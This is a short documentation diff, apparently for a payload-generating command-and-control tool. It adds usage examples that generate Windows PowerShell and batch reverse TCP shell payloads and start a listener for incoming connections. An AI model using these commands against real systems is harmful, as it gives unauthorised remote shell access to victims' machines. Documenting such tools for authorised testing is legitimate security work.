@@ -42,11 +42,15 @@ Display help information with examples of command usage.
 Generate a payload for a Windows PowerShell reverse TCP connection:
 ```python
 generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050
+generate payload=windows/powershell/reverse_tcp lport=5050
+generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050
+generate payload=windows/batch/reverse_tcp lport=5050
 ```
 
 Start the server and listen for incoming connections:
 ```python
 server rhost=192.168.10.1 rport=5050 listening=true
+server rport=5050 listening=true
 ```
 
 View the list of connected clients:
